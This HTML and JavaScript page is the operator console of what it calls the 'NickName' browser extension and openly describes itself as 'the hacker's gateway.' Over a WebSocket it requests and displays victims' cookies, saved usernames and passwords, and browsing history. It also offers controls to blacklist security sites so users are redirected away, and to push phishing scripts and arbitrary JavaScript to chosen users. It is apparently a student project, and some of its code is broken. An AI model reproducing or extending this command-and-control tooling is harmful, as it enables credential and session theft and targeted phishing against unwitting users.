<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpeedDemon</title>
    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
	  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
		<script>
			var HOST = location.origin.replace(/^http/, 'ws');
			var serverID = "0";
var ws = new WebSocket(HOST);  
var sites = new Array();

function resetSocket(){//fix for reseting sockets
    console.log("reseting socket");
    ws= new WebSocket(HOST);
    ws.onclose = function(){
        setTimeout(resetSocket, 1000);
    };
}
ws.onclose = function(){
		console.log("reseting socket");
    setTimeout(resetSocket, 1000);
};

ws.onopen = function(event){
    var jsonPackage ={type:'getList'};
    ws.send(JSON.stringify(jsonPackage));
    console.log("Request sent");
    var jsonPackage ={type:'getClients'};
    ws.send(JSON.stringify(jsonPackage));
    console.log("Request sent");
    var jsonPackage ={type:'getHistory'};
    ws.send(JSON.stringify(jsonPackage));
    var jsonPackage = {type:'getCookies'};
    ws.send(JSON.stringify(jsonPackage));
    var jsonPackage = {type:'getLoginInfo'};
    ws.send(JSON.stringify(jsonPackage));
}

ws.onmessage = function(e){
    document.getElementById('p1').innerHTML +="\n"+e.data;

    console.log(e.data);
    object = JSON.parse(e.data);
    switch(object.type){
        case 'blackList':
            sites = object.allSites;
            console.log(object.allSites);
            console.log("got something");
            sites.forEach(site => {
                node = document.getElementById("blacklist");
                aRow = document.createElement("li");
                aRow.classList.add("list-group-item");
                aCol = document.createTextNode(site);
                node.appendChild(aRow);
                aRow.appendChild(aCol);
            });
            break;
        case 'statusList':
            console.log("got a status");
            var ids = new Array();
            ids = object.ids;
            var statuses = object.status;
            for (i = 0; i < ids.length; i++){
                makeCard(ids[i],statuses[i])
            }
            break;
        case 'idHistory':
            fillHistory(object.targetID, object.historyArray);
            break;
        case 'cookieID':
            fillCookies(object.targetID, object.name[i], object.domain[i], object.value[i]);
            break;
        case 'userInfo':
            fillLogins(object.targetID,object.domain,object.username,object.value);
            break;
    }    
}

function blackList(){
    var URL = document.getElementById("Blacklist_URL");
    var jsonPackage = {id: 0, type:'list', addString: URL};
    ws.send(JSON.stringify(jsonPackage));
}
window.addEventListener("hashchange", function() { scrollBy(0, -70) });

function js(){
    var id = document.getElementById("JS_ID").value;
    var script = document.getElementById("JS_SCRIPT").value;
    var url = document.getElementById("JS_URL").value;
    alert(url);
    //var jsonPackage = {id: id, type:"sendJavascript", script:script, domain:url};
    //ws.send(JSON.stringify(jsonPackage));
}

function phish(){
    var id = document.getElementById("Phishing_ID").value;
    var url = document.getElementById("Phishing_URL").value;
    var jsonPackage = {id: id, type:"sendPhishingscript", domain:url};
    ws.send(JSON.stringify(jsonPackage));
}

function send() {
var id = document.getElementById('id').value;
var type = document.getElementById('type').value;
var dataType = document.getElementById('dataType').value;
var data = document.getElementById('data').value;
if (document.getElementById('data2').value!=""){
    if (document.getElementById('data3').value!=""){
    var data2 = document.getElementById('data2').value;
    var data3 = document.getElementById('data3').value;
    var dataType2 = document.getElementById('dataType2').value;
    var dataType3 = document.getElementById('dataType3').value;
    var obj = { id: id, type: type, [dataType]: data, [dataType2]: data2, [dataType3]: data3};
    }
    else{
    var data2 = document.getElementById('data2').value;
    var dataType2 = document.getElementById('dataType2').value;
    var obj = { id: id, type: type, [dataType]: data, [dataType2]: data2};
    //var obj = { id: serverID, type: type, [dataType]: data, [dataType2]: data2};
    }
}
else {
    if (dataType=="history"){
    var arr = ["google.com","youtube.com","facebook.com","twitter.com","walmart.com","microsoft.com"];
    var obj = { id: id, type: type, [dataType]: arr };
    }
    else
    var obj = { id: id, type: type, [dataType]: data };
}
    console.log('sending '+obj);
    ws.send(JSON.stringify(obj));
}


window.userCount = 0;   // Declare a global variable
			        //This global var is used to give each new user card added a different id

function makeCard(id, status) {
    userCount++;
    console.log("making");
    var cardInfo = document.getElementById("infoCard");
    var card = cardInfo.cloneNode(true);
    //Clones info card to be turned into a user card
    card.id = userCount; //gives card a unique id

    var header = card.children[0];
    var link = header.children[0];
    if(status == 'Online') link.innerHTML = id;
    else link.innerHTML = "<font color=\"red\">" + id + "</font>";
    link.id = "link" + userCount; //prepends "link" to id so it's diff than card id

    link.href = "#collapse" + userCount;
    //href can't begin with a number 

    var collapse = card.children[1];
    collapse.id = "collapse" + userCount;

    var body = collapse.children[0];
    body.id = "body" + userCount;
    body.innerHTML = "";
    //body will be filled in by other functions

    //add new card to accordion
    var addTo = document.getElementById("accordion");
    addTo.appendChild(card);
}

function blackList(){
    var jsonPackage = {id: 0, type:'list', addString: URL};
    ws.send(JSON.stringify(jsonPackage));
}

function fillCookies(index, nameArray, domainArray, valueArray){
    index = "body" + index;
    //body of cards have id "body0", "body1", "body2", ...

    var table = document.createElement("table");

    var bigRow = document.createElement("tr");
    cell1 = bigRow.insertCell(0);
    cell2 = bigRow.insertCell(1);
    cell2.innerHTML = "SPACE";
    cell3 = bigRow.insertCell(2);
    cell4 = bigRow.insertCell(3);
    cell4.innerHTML = "SPACE";
    cell5 = bigRow.insertCell(4);

    for (var i = 0; i < nameArray.length; i++) {
        var aRow = document.createElement('tr');
        cell1.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = nameArray[i];
        aRow.appendChild(aCol);
    }
    var aRow = document.createElement('tr');
    bigRow.appendChild(aRow);
    for (var i = 0; i < domainArray.length; i++) {
        var aRow = document.createElement('tr');
        cell3.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = domainArray[i];
        aRow.appendChild(aCol);
    }
    var aRow = document.createElement('tr');
    bigRow.appendChild(aRow);
    for (var i = 0; i < valueArray.length; i++) {
        var aRow = document.createElement('tr');
        cell5.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = valueArray[i];
        aRow.appendChild(aCol);
    }

    var addTo = document.getElementById(index);
    addTo.appendChild(bigRow);
}

function fillHistory(index, historyArray){
    index = "body" + index;
    //body of cards have id "body0", "body1", "body2", ...

    var table = document.createElement("table");
    /*var header = table.createTHead();
    var row = header.insertRow(0);
    var cell = row.insertCell(0);
    cell.innerHTML = "<b>History</b>";*/

    for (var i = 0; i < historyArray.length; i++) {
        var aRow = document.createElement('tr');
        var aCol = document.createTextNode(historyArray[i]);
        table.appendChild(aRow);
        aRow.appendChild(aCol);
    }

    var addTo = document.getElementById(index);
    addTo.appendChild(table);

}

function fillLogins(id, urlArray, usernameArray, passwordArray){
    id = "body" + id;
    //body of cards have id "body0", "body1", "body2", ...

    var bigRow = document.createElement("tr");
    cell1 = bigRow.insertCell(0);
    cell2 = bigRow.insertCell(1);
    cell2.innerHTML = "SPACE";
    cell3 = bigRow.insertCell(2);
    cell4 = bigRow.insertCell(3);
    cell4.innerHTML = "SPACE";
    cell5 = bigRow.insertCell(4);

    for (var i = 0; i < nameArray.length; i++) {
        var aRow = document.createElement('tr');
        cell1.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = urlArray[i];
        aRow.appendChild(aCol);
    }
    for (var i = 0; i < domainArray.length; i++) {
        var aRow = document.createElement('tr');
        cell3.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = usernameArray[i];
        aRow.appendChild(aCol);
    }
    for (var i = 0; i < valueArray.length; i++) {
        var aRow = document.createElement('tr');
        cell5.appendChild(aRow);
        var aCol = document.createElement('td');
        aCol.innerHTML = passwordArray[i];
        aRow.appendChild(aCol);
    }

    var addTo = document.getElementById(id);
    addTo.appendChild(bigRow);
}
		</script>
  </head>

  

  <body data-spy = "scroll" data-target=".navbar">

	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
		<a class="navbar-brand" href="#">NickName123</a>
		<ul class = "navbar-nav">
			<li class="nav-item">
				<a class="nav-link" href="#userSection">Users</a>
			</li>
			<li class = "nav-item">
				<a class="nav-link" href="#blackListSection">Blacklist</a>
			</li>
		</ul>
	</nav>

	<!-- Logo And Name -->
	<div class = "jumbotron">
		<h1 class = "display-4">NickName Console</h1>
		<p class = "lead">
			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
		</p>
		<hr class="my-4">
		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
	</div>  

	<div id = "userSection">
	
		<div class="container-fluid">
			<h4>All Users</h4>
			<div id="accordion">
          <div id="infoCard" class="card">
              <div id="infoCardHeader" class="card-header">
                <a id="infoCardLink" class="card-link" data-toggle="collapse" href="#infoCardCollapse">Info
                </a>
              </div>
              <div id="infoCardCollapse" class="collapse" data-parent="#accordion">
                <div id="infoCardBody" class="card-body">Click an ID to view its cookies, login details, and history. Blue users are online, and red users are offline.
                </div>
              </div>
            </div>
			</div>
		</div>

	</div>	
	<!-- Spacing things Out -->
	<br><br>

	<div class = "ml-3">
    <div id = "blackListSection">

	<h4>Blacklisted Sites</h4>
    <ul class = "list-group" id="blacklist"></ul>
    
    <br>

    <!-- Adding Blacklisted Site -->
    <h4>Add Site to Blacklist Here</h4>
    <input type="text" class="form-control blacklist" placeholder="URL">
    <button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>

    <br><br>

    <!-- Add Phishing -->
    <form name="phishingForm" onsubmit "return phish()">
        <h4>Add phishing script:</h4>
        <br>
        <input type = "text" name = "Phishing_ID" placeholder = "User ID"><br>
        <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
        <input type = "submit" name = "Submit_Phishing_Script" class="btn btn-primary">
    </form>

    <br>

    <!-- Add Javascript -->
    <form name="jsForm" onsubmit "return js()">
        <h4>Add javascript execution script:</h4>
        <br>
        <input type = "text" name = "JS_ID" placeholder = "User ID"><br>
        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
        <input type = "submit" name = "Submit_JS_Script" class="btn btn-primary">
    </form>

	</div>
	</div>
  </div>

  <br><br>
  
  <form onsubmit="send();return false;">
    ID: <input type="text" id="id"><br>
    Type: <input type="text" id="type"><br>
    <input type="text" id="dataType">: <input type="text" id="data"><br>
    <input type="text" id="dataType2">: <input type="text" id="data2"><br>
    <input type="text" id="dataType3">: <input type="text" id="data3"><br>
    <input type="submit" value="Submit">
  </form>
  <p id="p1">Recieved data will show here:</p>


  </body>

  

</html>
